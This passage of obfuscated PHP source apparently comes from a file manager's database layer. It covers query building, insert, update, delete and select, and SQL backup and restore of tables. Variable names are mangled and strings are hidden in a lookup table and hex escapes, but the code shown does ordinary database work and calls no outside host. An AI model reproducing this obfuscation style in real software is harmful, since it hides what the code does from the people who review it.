$¡‘Åõ [902] . $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $×½¢°Œ[1] . $¡‘Åõ [1017]; } elseif (preg_match($¡‘Åõ [1018], $×½¢°Œ[0])) { $ŞÇ¬‘×ı .= $×½¢°Œ[0]; } elseif (preg_match($¡‘Åõ [1019], $×½¢°Œ[0])) { if (isset($×½¢°Œ[2]) && $¡‘Åõ [297] == $×½¢°Œ[2]) { $ŞÇ¬‘×ı .= $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $this->exp[$ÆÉ×ÎİÍ] . $¡‘Åõ [53] . $×½¢°Œ[1]; } else { if (is_string($×½¢°Œ[1])) { $×½¢°Œ[1] = explode($¡‘Åõ [50], $×½¢°Œ[1]); } $Û³¨‚ŸË = implode($¡‘Åõ [50], $this->parseValue($×½¢°Œ[1])); $ŞÇ¬‘×ı .= $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $this->exp[$ÆÉ×ÎİÍ] . $¡‘Åõ [902] . $Û³¨‚ŸË . $¡‘Åõ [904]; } } elseif (preg_match($¡‘Åõ [1020], $×½¢°Œ[0])) { $Û§‡ºµ = is_string($×½¢°Œ[1]) ? explode($¡‘Åõ [50], $×½¢°Œ[1]) : $×½¢°Œ[1]; $ŞÇ¬‘×ı .= $¡‘Åõ [902] . $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $this->exp[$ÆÉ×ÎİÍ] . $¡‘Åõ [53] . $this->parseValue($Û§‡ºµ[0]) . $¡‘Åõ [1003] . $this->parseValue($Û§‡ºµ[1]) . $¡‘Åõ [278]; } else { think_exception(think_lang($¡‘Åõ [1006]) . $¡‘Åõ [4] . $×½¢°Œ[0]); } } else { $¾ŠÍ”É = count($×½¢°Œ); $«ê˜ÙŸ = $¡‘Åõ [12]; if (is_string($×½¢°Œ[$¾ŠÍ”É - 1])) { $«ê˜ÙŸ = isset($×½¢°Œ[$¾ŠÍ”É - 1]) ? strtoupper($×½¢°Œ[$¾ŠÍ”É - 1]) : $¡‘Åõ [12]; if (in_array($«ê˜ÙŸ, array($¡‘Åõ [1000], $¡‘Åõ [1001], $¡‘Åõ [1002]))) { $¾ŠÍ”É = $¾ŠÍ”É - 1; } } else { $«ê˜ÙŸ = $¡‘Åõ [1000]; } for ($´Ì¾©¦ = 0; $´Ì¾©¦ < $¾ŠÍ”É; $´Ì¾©¦++) { $Û§‡ºµ = is_array($×½¢°Œ[$´Ì¾©¦]) ? $×½¢°Œ[$´Ì¾©¦][1] : $×½¢°Œ[$´Ì¾©¦]; if ($¡‘Åõ [297] == strtolower($×½¢°Œ[$´Ì¾©¦][0])) { $ŞÇ¬‘×ı .= $¡‘Åõ [260] . $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $Û§‡ºµ . $¡‘Åõ [1017] . $«ê˜ÙŸ . $¡‘Åõ [53]; } else { $²²Úƒ¯² = is_array($×½¢°Œ[$´Ì¾©¦]) ? $this->exp[strtolower($×½¢°Œ[$´Ì¾©¦][0])] : $¡‘Åõ [883]; if (!$²²Úƒ¯² && is_array($×½¢°Œ[$´Ì¾©¦]) && in_array($×½¢°Œ[$´Ì¾©¦][0], array($¡‘Åõ [883], $¡‘Åõ [1010], $¡‘Åõ [1011], $¡‘Åõ [1012], $¡‘Åõ [1013], $¡‘Åõ [1014]))) { $²²Úƒ¯² = $×½¢°Œ[$´Ì¾©¦][0]; } $ŞÇ¬‘×ı .= $¡‘Åõ [260] . $ûÛ–¡ÎŸ . $¡‘Åõ [53] . $²²Úƒ¯² . $¡‘Åõ [53] . $this->parseValue($Û§‡ºµ) . $¡‘Åõ [1017] . $«ê˜ÙŸ . $¡‘Åõ [53]; } } $ŞÇ¬‘×ı = substr($ŞÇ¬‘×ı, 0, -4); } } else { $ŞÇ¬‘×ı .= $ûÛ–¡ÎŸ . $¡‘Åõ [1021] . $this->parseValue($×½¢°Œ); } return $ŞÇ¬‘×ı; } protected function parseThinkWhere($¸ÔÏßË, $™½›Ù®) { $°Üó£¾° =& $_SERVER[ì™ı‰º¯]; $¿Ş²äÛë = $°Üó£¾°[12]; switch ($¸ÔÏßË) { case $°Üó£¾°[352]: $¿Ş²äÛë = $™½›Ù®; break; case $°Üó£¾°[1004]: $¿Ş²äÛë = is_string($™½›Ù®) ? $™½›Ù® : substr($this->parseWhere($™½›Ù®), 6); break; case $°Üó£¾°[1022]: parse_str($™½›Ù®, $û¸Åâš); if (isset($û¸Åâš[$°Üó£¾°[999]])) { $åÂŸŸæˆ = $°Üó£¾°[53] . strtoupper($û¸Åâš[$°Üó£¾°[999]]) . $°Üó£¾°[53]; unset($û¸Åâš[$°Üó£¾°[999]]); } else { $åÂŸŸæˆ = $°Üó£¾°[1003]; } $âÆæÑ¨­ = array(); foreach ($û¸Åâš as $šÆéÃË’ => $¿ÉÌÀ§¢) { $âÆæÑ¨­[] = $this->parseKey($šÆéÃË’) . $°Üó£¾°[1021] . $this->parseValue($¿ÉÌÀ§¢); } $¿Ş²äÛë = implode($åÂŸŸæˆ, $âÆæÑ¨­); break; } return $¿Ş²äÛë; } protected function parseLimit($Û™ŞŒòÂ) { $×ãì° =& $_SERVER[ì™ı‰º¯]; return !empty($Û™ŞŒòÂ) ? $×ãì°[51] . $Û™ŞŒòÂ . $×ãì°[53] : $×ãì°[12]; } protected function parseJoin($æÃâÒÀè) { $µ¯­§°‰ =& $_SERVER[ì™ı‰º¯]; $´œöìÑŞ = $µ¯­§°‰[12]; if (!empty($æÃâÒÀè)) { if (is_array($æÃâÒÀè)) { foreach ($æÃâÒÀè as $Ïê†Œ¹û => $íÇ©»î) { if (!1 !== stripos($íÇ©»î, $µ¯­§°‰[1023])) { $´œöìÑŞ .= $µ¯­§°‰[53] . $íÇ©»î; } else { $´œöìÑŞ .= $µ¯­§°‰[1024] . $íÇ©»î; } } } else { $´œöìÑŞ .= $µ¯­§°‰[1024] . $æÃâÒÀè; } } $´œöìÑŞ = preg_replace($µ¯­§°‰[1025], think_config($µ¯­§°‰[929]) . $µ¯­§°‰[1026], $´œöìÑŞ); return $´œöìÑŞ; } protected function parseOrder($‚‹Îıïø) { $·å¬êé³ =& $_SERVER[ì™ı‰º¯]; if (is_array($‚‹Îıïø)) { $€ƒöë¥à = array(); foreach ($‚‹Îıïø as $Œöº„Ä… => $ºà„ ¾) { if (is_numeric($Œöº„Ä…)) { $€ƒöë¥à[] = $this->parseKey($ºà„ ¾); } else { $ºà„ ¾ = in_array(strtoupper(trim($ºà„ ¾)), array($·å¬êé³[1027], $·å¬êé³[1028])) ? $·å¬êé³[53] . $ºà„ ¾ : $·å¬êé³[12]; if (preg_match($·å¬êé³[1029], $Œöº„Ä…)) { $€ƒöë¥à[] = $this->parseKey($Œöº„Ä…) . $ºà„ ¾; } else { think_exception($·å¬êé³[1030] . $Œöº„Ä…); } } } $‚‹Îıïø = implode($·å¬êé³[50], $€ƒöë¥à); } return !empty($‚‹Îıïø) ? $·å¬êé³[1031] . $‚‹Îıïø : $·å¬êé³[12]; } protected function parseGroup($¤³ûØÁë) { $â£ôäÆ =& $_SERVER[ì™ı‰º¯]; return !empty($¤³ûØÁë) ? $â£ôäÆ[1032] . $¤³ûØÁë : $â£ôäÆ[12]; } protected function parseHaving($¶èÏÓ…Ü) { $Ş­ì›¹ã =& $_SERVER[ì™ı‰º¯]; return !empty($¶èÏÓ…Ü) ? $Ş­ì›¹ã[1033] . $¶èÏÓ…Ü : $Ş­ì›¹ã[12]; } protected function parseComment($ÇóŞÊÔì) { $ÎÄ±ö“¨ =& $_SERVER[ì™ı‰º¯]; return !empty($ÇóŞÊÔì) ? $ÎÄ±ö“¨[1034] . $ÇóŞÊÔì . $ÎÄ±ö“¨[1035] : $ÎÄ±ö“¨[12]; } protected function parseDistinct($İ‹ÌĞØ) { $©€¡ø–¿ =& $_SERVER[ì™ı‰º¯]; return !empty($İ‹ÌĞØ) ? $©€¡ø–¿[1036] : $©€¡ø–¿[12]; } protected function parseUnion($µôÇ¼†…) { $ÜèøÍ‹õ =& $_SERVER[ì™ı‰º¯]; if (empty($µôÇ¼†…)) { return $ÜèøÍ‹õ[12]; } if (isset($µôÇ¼†…[$ÜèøÍ‹õ[348]])) { $æØ¡×º = $ÜèøÍ‹õ[1037]; unset($µôÇ¼†…[$ÜèøÍ‹õ[348]]); } else { $æØ¡×º = $ÜèøÍ‹õ[1038]; } foreach ($µôÇ¼†… as $¿¶°£–…) { $¬àÎ‚¦û[] = $æØ¡×º . (is_array($¿¶°£–…) ? $this->buildSelectSql($¿¶°£–…) : $¿¶°£–…); } return implode($ÜèøÍ‹õ[53], $¬àÎ‚¦û); } public function insert($¼ïÅ³Ë¼, $îœíñì = array(), $ĞÀ¹Èé‘ = false) { $ì¹Ñ’µ =& $_SERVER[ì™ı‰º¯]; $”’ÎøôÙ = $ËÃ¨¸œ‹ = array(); $this->model = $îœíñì[$ì¹Ñ’µ[281]]; foreach ($¼ïÅ³Ë¼ as $„ÄáÇË˜ => $šÀö¹ÅŞ) { if (is_array($šÀö¹ÅŞ) && $ì¹Ñ’µ[297] == $šÀö¹ÅŞ[0]) { $ËÃ¨¸œ‹[] = $this->parseKey($„ÄáÇË˜); $”’ÎøôÙ[] = $šÀö¹ÅŞ[1]; } elseif (is_scalar($šÀö¹ÅŞ) || is_null($šÀö¹ÅŞ)) { $ËÃ¨¸œ‹[] = $this->parseKey($„ÄáÇË˜); $”’ÎøôÙ[] = $this->parseValue($šÀö¹ÅŞ); } } $¸©õÓĞ  = ($ĞÀ¹Èé‘ ? $ì¹Ñ’µ[906] : $ì¹Ñ’µ[907]) . $ì¹Ñ’µ[908] . $this->parseTable($îœíñì[$ì¹Ñ’µ[279]]) . $ì¹Ñ’µ[902] . implode($ì¹Ñ’µ[50], $ËÃ¨¸œ‹) . $ì¹Ñ’µ[903] . implode($ì¹Ñ’µ[50], $”’ÎøôÙ) . $ì¹Ñ’µ[904]; $¸©õÓĞ  .= $this->parseLock(isset($îœíñì[$ì¹Ñ’µ[839]]) ? $îœíñì[$ì¹Ñ’µ[839]] : !1); $¸©õÓĞ  .= $this->parseComment(!empty($îœíñì[$ì¹Ñ’µ[354]]) ? $îœíñì[$ì¹Ñ’µ[354]] : $ì¹Ñ’µ[12]); return $this->execute($¸©õÓĞ , $this->parseBind(!empty($îœíñì[$ì¹Ñ’µ[285]]) ? $îœíñì[$ì¹Ñ’µ[285]] : array())); } public function selectInsert($¶¬‡¨‚Û, $çïî„Çå, $Î§›Ëù = array()) { $ì„ñ‚…À =& $_SERVER[ì™ı‰º¯]; $this->model = $Î§›Ëù[$ì„ñ‚…À[281]]; if (is_string($¶¬‡¨‚Û)) { $¶¬‡¨‚Û = explode($ì„ñ‚…À[50], $¶¬‡¨‚Û); } array_walk($¶¬‡¨‚Û, array($this, $ì„ñ‚…À[905])); $‡¾…Íî = $ì„ñ‚…À[1039] . $this->parseTable($çïî„Çå) . $ì„ñ‚…À[902] . implode($ì„ñ‚…À[50], $¶¬‡¨‚Û) . $ì„ñ‚…À[1017]; $‡¾…Íî .= $this->buildSelectSql($Î§›Ëù); return $this->execute($‡¾…Íî, $this->parseBind(!empty($Î§›Ëù[$ì„ñ‚…À[285]]) ? $Î§›Ëù[$ì„ñ‚…À[285]] : array())); } public function update($€”¨ü²›, $ÁˆÎ’à) { $ÍóÅßö£ =& $_SERVER[ì™ı‰º¯]; $this->model = $ÁˆÎ’à[$ÍóÅßö£[281]]; $œ¡¦¥± = $ÍóÅßö£[1040] . $this->parseTable($ÁˆÎ’à[$ÍóÅßö£[279]]) . $this->parseSet($€”¨ü²›) . $this->parseWhere(!empty($ÁˆÎ’à[$ÍóÅßö£[275]]) ? $ÁˆÎ’à[$ÍóÅßö£[275]] : $ÍóÅßö£[12]) . $this->parseOrder(!empty($ÁˆÎ’à[$ÍóÅßö£[365]]) ? $ÁˆÎ’à[$ÍóÅßö£[365]] : $ÍóÅßö£[12]) . $this->parseLimit(!empty($ÁˆÎ’à[$ÍóÅßö£[292]]) ? $ÁˆÎ’à[$ÍóÅßö£[292]] : $ÍóÅßö£[12]) . $this->parseLock(isset($ÁˆÎ’à[$ÍóÅßö£[839]]) ? $ÁˆÎ’à[$ÍóÅßö£[839]] : !1) . $this->parseComment(!empty($ÁˆÎ’à[$ÍóÅßö£[354]]) ? $ÁˆÎ’à[$ÍóÅßö£[354]] : $ÍóÅßö£[12]); return $this->execute($œ¡¦¥±, $this->parseBind(!empty($ÁˆÎ’à[$ÍóÅßö£[285]]) ? $ÁˆÎ’à[$ÍóÅßö£[285]] : array())); } public function delete($Ú½Ù•é = array()) { $ˆîç°ş =& $_SERVER[ì™ı‰º¯]; $this->model = $Ú½Ù•é[$ˆîç°ş[281]]; $†™¸ê‚ = $ˆîç°ş[1041] . $this->parseTable($Ú½Ù•é[$ˆîç°ş[279]]) . $this->parseWhere(!empty($Ú½Ù•é[$ˆîç°ş[275]]) ? $Ú½Ù•é[$ˆîç°ş[275]] : $ˆîç°ş[12]) . $this->parseOrder(!empty($Ú½Ù•é[$ˆîç°ş[365]]) ? $Ú½Ù•é[$ˆîç°ş[365]] : $ˆîç°ş[12]) . $this->parseLimit(!empty($Ú½Ù•é[$ˆîç°ş[292]]) ? $Ú½Ù•é[$ˆîç°ş[292]] : $ˆîç°ş[12]) . $this->parseLock(isset($Ú½Ù•é[$ˆîç°ş[839]]) ? $Ú½Ù•é[$ˆîç°ş[839]] : !1) . $this->parseComment(!empty($Ú½Ù•é[$ˆîç°ş[354]]) ? $Ú½Ù•é[$ˆîç°ş[354]] : $ˆîç°ş[12]); return $this->execute($†™¸ê‚, $this->parseBind(!empty($Ú½Ù•é[$ˆîç°ş[285]]) ? $Ú½Ù•é[$ˆîç°ş[285]] : array())); } public function select($‰ß®•šŞ = array()) { $³Ù§šş =& $_SERVER[ì™ı‰º¯]; $this->model = $‰ß®•šŞ[$³Ù§šş[281]]; $ğ”îö™ç = $this->buildSelectSql($‰ß®•šŞ); $‡şìİ¾— = isset($‰ß®•šŞ[$³Ù§šş[349]]) ? $‰ß®•šŞ[$³Ù§šş[349]] : !1; if ($‡şìİ¾—) { $Ñå£î¸± = is_string($‡şìİ¾—[$³Ù§šş[94]]) ? $‡şìİ¾—[$³Ù§šş[94]] : $³Ù§šş[1042] . md5($ğ”îö™ç); $Ø§¦¹•Å = think_cache($Ñå£î¸±, $³Ù§šş[12], $‡şìİ¾—); if (!1 !== $Ø§¦¹•Å) { return $Ø§¦¹•Å; } } $â§íß¼£ = $this->query($ğ”îö™ç, $this->parseBind(!empty($‰ß®•šŞ[$³Ù§šş[285]]) ? $‰ß®•šŞ[$³Ù§šş[285]] : array())); if ($‡şìİ¾— && !1 !== $â§íß¼£) { think_cache($Ñå£î¸±, $â§íß¼£, $‡şìİ¾—); } return $â§íß¼£; } public function buildSelectSql($Ò­»ß˜¶ = array()) { $ °°ö•˜ =& $_SERVER[ì™ı‰º¯]; if (isset($Ò­»ß˜¶[$ °°ö•˜[353]])) { if (strpos($Ò­»ß˜¶[$ °°ö•˜[353]], $ °°ö•˜[50])) { list($ÜşÂŒ–ó, $×ßÌ¿œ×) = explode($ °°ö•˜[50], $Ò­»ß˜¶[$ °°ö•˜[353]]); } else { $ÜşÂŒ–ó = $Ò­»ß˜¶[$ °°ö•˜[353]]; } $ÜşÂŒ–ó = $ÜşÂŒ–ó ? $ÜşÂŒ–ó : 1; $×ßÌ¿œ× = isset($×ßÌ¿œ×) ? $×ßÌ¿œ× : (is_numeric($Ò­»ß˜¶[$ °°ö•˜[292]]) ? $Ò­»ß˜¶[$ °°ö•˜[292]] : 20); $è®é™›” = $×ßÌ¿œ× * ((int) $ÜşÂŒ–ó - 1); $Ò­»ß˜¶[$ °°ö•˜[292]] = $è®é™›” . $ °°ö•˜[50] . $×ßÌ¿œ×; } if (think_config($ °°ö•˜[1043])) { $š˜ŞË÷¼ = $ °°ö•˜[1044] . md5(serialize($Ò­»ß˜¶)); $ĞµíÜ± = think_cache($š˜ŞË÷¼); if ($ĞµíÜ±) { return $ĞµíÜ±; } } $Õ†ÍÄ©İ = $this->parseSql($this->selectSql, $Ò­»ß˜¶); $Õ†ÍÄ©İ .= $this->parseLock(isset($Ò­»ß˜¶[$ °°ö•˜[839]]) ? $Ò­»ß˜¶[$ °°ö•˜[839]] : !1); if (isset($š˜ŞË÷¼)) { think_cache($š˜ŞË÷¼, $Õ†ÍÄ©İ); } return $Õ†ÍÄ©İ; } public function parseSql($‡šåå°¾, $ì”¾¯¾Ó = array()) { $‚€‘†† =& $_SERVER[ì™ı‰º¯]; $‡šåå°¾ = str_replace(array($‚€‘††[1045], $‚€‘††[1046], $‚€‘††[1047], $‚€‘††[1048], $‚€‘††[1049], $‚€‘††[1050], $‚€‘††[1051], $‚€‘††[1052], $‚€‘††[1053], $‚€‘††[1054], $‚€‘††[1055]), array($this->parseTable("{$ì”¾¯¾Ó[$‚€‘††[279]]}"), $this->parseDistinct(isset($ì”¾¯¾Ó[$‚€‘††[1056]]) ? $ì”¾¯¾Ó[$‚€‘††[1056]] : !1), $this->parseField(!empty($ì”¾¯¾Ó[$‚€‘††[273]]) ? $ì”¾¯¾Ó[$‚€‘††[273]] : $‚€‘††[189]), $this->parseJoin(!empty($ì”¾¯¾Ó[$‚€‘††[282]]) ? $ì”¾¯¾Ó[$‚€‘††[282]] : $‚€‘††[12]), $this->parseWhere(!empty($ì”¾¯¾Ó[$‚€‘††[275]]) ? $ì”¾¯¾Ó[$‚€‘††[275]] : $‚€‘††[12]), $this->parseGroup(!empty($ì”¾¯¾Ó[$‚€‘††[505]]) ? $ì”¾¯¾Ó[$‚€‘††[505]] : $‚€‘††[12]), $this->parseHaving(!empty($ì”¾¯¾Ó[$‚€‘††[1057]]) ? $ì”¾¯¾Ó[$‚€‘††[1057]] : $‚€‘††[12]), $this->parseOrder(!empty($ì”¾¯¾Ó[$‚€‘††[365]]) ? $ì”¾¯¾Ó[$‚€‘††[365]] : $‚€‘††[12]), $this->parseLimit(!empty($ì”¾¯¾Ó[$‚€‘††[292]]) ? $ì”¾¯¾Ó[$‚€‘††[292]] : $‚€‘††[12]), $this->parseUnion(!empty($ì”¾¯¾Ó[$‚€‘††[347]]) ? $ì”¾¯¾Ó[$‚€‘††[347]] : $‚€‘††[12]), $this->parseComment(!empty($ì”¾¯¾Ó[$‚€‘††[354]]) ? $ì”¾¯¾Ó[$‚€‘††[354]] : $‚€‘††[12])), $‡šåå°¾); return $‡šåå°¾; } public function getLastSql($•¦¦ú±İ = '') { return $•¦¦ú±İ ? $this->modelSql[$•¦¦ú±İ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($’Ï§ø‹Í) { return addslashes($’Ï§ø‹Í); } public function setModel($Ò¢Ùå¾Š) { $this->model = $Ò¢Ùå¾Š; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ÙÊû ßœ = array()) { $¯æ¹çöÆ =& $_SERVER[ì™ı‰º¯]; if (empty($ÙÊû ßœ)) { $ÙÊû ßœ = $GLOBALS[$¯æ¹çöÆ[6]][$¯æ¹çöÆ[21]]; } $this->database = $ÙÊû ßœ; } public function model($˜½î›éõ = '') { return new ModelBase($˜½î›éõ, $_SERVER[ì™ı‰º¯][12], $this->database); } public function db($î–ÇŸ‹ = false) { $ôí÷ì¯‰ =& $_SERVER[ì™ı‰º¯]; $èÃ¡Û°¡ = array_change_key_case($this->database); if ($this->dbType() == $ôí÷ì¯‰[13] || !$î–ÇŸ‹) { return $this->model()->db(); } $â–«ÇŞí = $èÃ¡Û°¡[$ôí÷ì¯‰[971]]; $èÃ¡Û°¡[$ôí÷ì¯‰[971]] = $ôí÷ì¯‰[12]; if ($èÃ¡Û°¡[$ôí÷ì¯‰[966]] == $ôí÷ì¯‰[963]) { $„Ü€ò»È = $èÃ¡Û°¡[$ôí÷ì¯‰[972]]; $èÃ¡Û°¡[$ôí÷ì¯‰[972]] = substr($„Ü€ò»È, 0, strrpos($„Ü€ò»È, $ôí÷ì¯‰[1058])); } $this->database = $èÃ¡Û°¡; $·§ñºŠé = $this->model()->db(); try { $’æ˜Ÿ’Â = $·§ñºŠé->execute("\x73\x68\157\x77\x20\144\x61\164\x61\142\141\x73\x65\163\40\154\151\x6b\x65\40\47{$â–«ÇŞí}\x27"); } catch (Exception $™È§ÉøÓ) { } if (!$’æ˜Ÿ’Â) { $·§ñºŠé->execute("\143\x72\x65\x61\x74\145\x20\144\141\164\141\142\x61\163\145\40\x60{$â–«ÇŞí}\140"); } $èÃ¡Û°¡[$ôí÷ì¯‰[971]] = $â–«ÇŞí; if ($èÃ¡Û°¡[$ôí÷ì¯‰[966]] == $ôí÷ì¯‰[963]) { $èÃ¡Û°¡[$ôí÷ì¯‰[972]] .= $ôí÷ì¯‰[1058] . $â–«ÇŞí; } $this->database = $èÃ¡Û°¡; $·§ñºŠé->execute("\x75\x73\x65\40\140{$â–«ÇŞí}\140"); return $·§ñºŠé; } public function createTable($©™’âç«, &$ıƒ™ìàÓ) { $ğ‰øŠê· =& $_SERVER[ì™ı‰º¯]; if (!IO::exist($©™’âç«)) { ActionCall($ğ‰øŠê·[1059], !0, 0); show_json(LNG($ğ‰øŠê·[1060]), !1); } $£¡šÈ´œ = $this->model()->db(); $Ÿ»Ğå = sqlSplit(IO::getContent($©™’âç«)); foreach ($Ÿ»Ğå as $ÊÇÙç¹) { $Ìãİ‰ ” = stripos($ÊÇÙç¹, $ğ‰øŠê·[1061]) === 0; if ($Ìãİ‰ ”) { $ıƒ™ìàÓ->task[$ğ‰øŠê·[782]] += 1; } $£¡šÈ´œ->execute($ÊÇÙç¹); if ($Ìãİ‰ ”) { preg_match($ğ‰øŠê·[1062], $ÊÇÙç¹, $èª”ÀÙ); $ıƒ™ìàÓ->task[$ğ‰øŠê·[1063]] = $èª”ÀÙ[1]; $ıƒ™ìàÓ->update(1); } } } public function insertTable($ğÃ—¶ÁÁ, &$Êµ Ø¿) { $ö­Ş±€ı =& $_SERVER[ì™ı‰º¯]; $çÙôÌÌÖ = $this->model()->db(); $½×â€¯Â = $Çû“ÜŞæ ? array($Çû“ÜŞæ) : $çÙôÌÌÖ->getTables(); foreach ($ğÃ—¶ÁÁ as $šçóœŠ ) { $Çû“ÜŞæ = basename($šçóœŠ , $ö­Ş±€ı[784]); if (!in_array($Çû“ÜŞæ, $½×â€¯Â)) { continue; } $Êµ Ø¿->task[$ö­Ş±€ı[1063]] = $Çû“ÜŞæ; if (get_filesize($šçóœŠ ) == 0) { continue; } $‘°åıÑé = $this->sqlToDb($šçóœŠ , $Êµ Ø¿); if (!$‘°åıÑé) { ActionCall($ö­Ş±€ı[1059], !0, 0); show_json(LNG($ö­Ş±€ı[1064]) . "\133{$Çû“ÜŞæ}\x5d", !1); } } } public function sqlFromDb($ÁËµô¸½, $£ä–‚ª·, &$…‰Ñˆª°, $ÛÄî¾ô = '') { if ($…‰Ñˆª°) { $…‰Ñˆª°->task[$_SERVER[ì™ı‰º¯][1063]] = $ÁËµô¸½; } $ÆËÕ¶Ÿ« = $this->model($ÁËµô¸½); $ØÛ£š¡ä = 0; $è™¢µÌ­ = 0; $­š—Ã’ı = 10000; $®æ„Îƒ = fopen($£ä–‚ª·, $_SERVER[ì™ı‰º¯][1065]); $û§¦€Âí = $ÆËÕ¶Ÿ«->getPk(); $ªü¢ÏùÏ = $ÆËÕ¶Ÿ«->getDbFields(); $©¹Ó¬Ø° = $_SERVER[ì™ı‰º¯][12]; if ($GLOBALS[$_SERVER[ì™ı‰º¯][783]] && in_array($ÁËµô¸½, array($_SERVER[ì™ı‰º¯][1066], $_SERVER[ì™ı‰º¯][1067]))) { $©¹Ó¬Ø° = $ÁËµô¸½; } do { $Š£¶Ä™Ì = array($û§¦€Âí => array($_SERVER[ì™ı‰º¯][1013], $è™¢µÌ­)); $ƒÒõÄÈ÷ = $ÆËÕ¶Ÿ«->where($Š£¶Ä™Ì)->field($ªü¢ÏùÏ)->order($û§¦€Âí . $_SERVER[ì™ı‰º¯][1068])->limit($­š—Ã’ı)->select(); $ƒÒõÄÈ÷ = !empty($ƒÒõÄÈ÷) ? $ƒÒõÄÈ÷ : array(); if (!($‚ø¢¾º = count($ƒÒõÄÈ÷))) { break; } $‰ˆåâñÌ = end($ƒÒõÄÈ÷); $è™¢µÌ­ = $‰ˆåâñÌ[$û§¦€Âí]; $¿ÉÊüÔ = array(); foreach ($ƒÒõÄÈ÷ as $ÎÅàîµ‰) { if ($©¹Ó¬Ø°) { if ($ÁËµô¸½ == $_SERVER[ì™ı‰º¯][1066]) { if ($ÎÅàîµ‰[$_SERVER[ì™ı‰º¯][33]] == $_SERVER[ì™ı‰º¯][1069]) { $šˆÜã’á = json_decode($ÎÅàîµ‰[$_SERVER[ì™ı‰º¯][374]], !0); if ($šˆÜã’á[$_SERVER[ì™ı‰º¯][32]] == $GLOBALS[$_SERVER[ì™ı‰º¯][783]] && $šˆÜã’á[$_SERVER[ì™ı‰º¯][745]] != 1) { continue; } } } else { if ($ÎÅàîµ‰[$_SERVER[ì™ı‰º¯][33]] == $_SERVER[ì™ı‰º¯][1070] && $ÎÅàîµ‰[$_SERVER[ì™ı‰º¯][94]] == $_SERVER[ì™ı‰º¯][775]) { continue; } } } if ($ÛÄî¾ô) { $ÎÅàîµ‰[$_SERVER[ì™ı‰º¯][84]] = "\x7b\x69\x6f\72{$ÛÄî¾ô}\x7d" . substr($ÎÅàîµ‰[$_SERVER[ì™ı‰º¯][84]], strlen("\x7b\151\157\72{$ÎÅàîµ‰[$_SERVER[ì™ı‰º¯][813]]}\175")); $ÎÅàîµ‰[$_SERVER[ì™ı‰º¯][813]] = $ÛÄî¾ô; } $¿ÉÊüÔ[] = $_SERVER[ì™ı‰º¯][1071] . $this->sqlEncode($ÎÅàîµ‰) . $_SERVER[ì™ı‰º¯][1072]; } $ßõÅøüô = "\x49\x4e\123\x45\x52\x54\x20\111\116\124\x4f\x20\x60{$ÁËµô¸½}\x60\40\50\x60" . implode($_SERVER[ì™ı‰º¯][1073], $ªü¢ÏùÏ) . $_SERVER[ì™ı‰º¯][1074]; fwrite($®æ„Îƒ, $ßõÅøüô . implode($_SERVER[ì™ı‰º¯][1075], $¿ÉÊüÔ) . $_SERVER[ì™ı‰º¯][71] . PHP_EOL); $ØÛ£š¡ä += $‚ø¢¾º; if ($…‰Ñˆª°) { $…‰Ñˆª°->update($‚ø¢¾º); } } while ($­š—Ã’ı == $‚ø¢¾º); fclose($®æ„Îƒ); return $ØÛ£š¡ä; } public function sqlToDb($¸Ç’­íÂ, &$œôÛÓı) { $ÍªÌ”Ù =& $_SERVER[ì™ı‰º¯]; $Æ´à«¶Â = $this->model()->db(); $Ó˜¡çô = @fopen($¸Ç’­íÂ, $ÍªÌ”Ù[1076]); if (!$Ó˜¡çô) { return !1; } $©µß™Áß = 0; $ˆÄÌæõ¼ = $ÍªÌ”Ù[12]; $³¥ãïÛ = array(); $ôÚÜÎ·Ù = $this->dbType(); $êŞø€ø = $ôÚÜÎ·Ù == $ÍªÌ”Ù[13] ? 500 : 2000; $Ç¯òÅÙÇ = basename($¸Ç’­íÂ, $ÍªÌ”Ù[784]); $Œè¢ÂŞÆ = 0; $¯÷·éş° = 4194304 - 104858; $Ïü¤¾¦Œ = 1000000 - 104858; while (!feof($Ó˜¡çô)) { $Š°¦½Ñï = trim(fgets($Ó˜¡çô)); if (!$Š°¦½Ñï) { continue; } $¤äìçéß = $this->sqlDecode($Š°¦½Ñï, $ôÚÜÎ·Ù, $Ç¯òÅÙÇ); if (stripos($¤äìçéß, $ÍªÌ”Ù[355]) === 0) { if (!$ˆÄÌæõ¼) { $ˆÄÌæõ¼ = $¤äìçéß . $ÍªÌ”Ù[53]; } continue; } if ($œôÛÓı) { $œôÛÓı->task[$ÍªÌ”Ù[782]] += 1; } $©µß™Áß++; $³¥ãïÛ[] = rtrim(rtrim(trim($¤äìçéß), $ÍªÌ”Ù[50]), $ÍªÌ”Ù[71]); $ÆÆĞíÅ¼ = null; $È«»ıÀ = strlen($¤äìçéß); $Œè¢ÂŞÆ += $È«»ıÀ; if ($Œè¢ÂŞÆ >= ($êŞø€ø == 500 ? $Ïü¤¾¦Œ : $¯÷·éş°)) { $ÆÆĞíÅ¼ = array_pop($³¥ãïÛ); if ($©µß™Áß > 1) { $©µß™Áß--; } } if ($©µß™Áß >= $êŞø€ø || $ÆÆĞíÅ¼) { $¤äìçéß = $ˆÄÌæõ¼ . implode($ÍªÌ”Ù[50], $³¥ãïÛ); if (!$Æ´à«¶Â->execute($¤äìçéß)) { return !1; } if ($œôÛÓı) { $œôÛÓı->update($©µß™Áß); } $³¥ãïÛ = array(); $©µß™Áß = 0; $Œè¢ÂŞÆ = 0; if ($ÆÆĞíÅ¼) { $³¥ãïÛ = array($ÆÆĞíÅ¼); $©µß™Áß = 1; $Œè¢ÂŞÆ = $È«»ıÀ; } } } fclose($Ó˜¡çô); if (!empty($³¥ãïÛ)) { $¤äìçéß = $ˆÄÌæõ¼ . implode($ÍªÌ”Ù[50], $³¥ãïÛ); if (!$Æ´à«¶Â->execute($¤äìçéß)) { return !1; } if ($œôÛÓı) { $œôÛÓı->update($©µß™Áß); } } return !0; } public function dropTable($Œ»û¡è‰ = null) { $Áïª§Ûó = $this->model()->db(); $ª¼âˆÄŠ = $Œ»û¡è‰ ? array($Œ»û¡è‰) : $Áïª§Ûó->getTables(); if (!$ª¼âˆÄŠ) { return; } foreach ($ª¼âˆÄŠ as $Œ»û¡è‰) { if ($Œ»û¡è‰) { $Œ»û¡è‰ = strtolower($Œ»û¡è‰); } else { continue; } 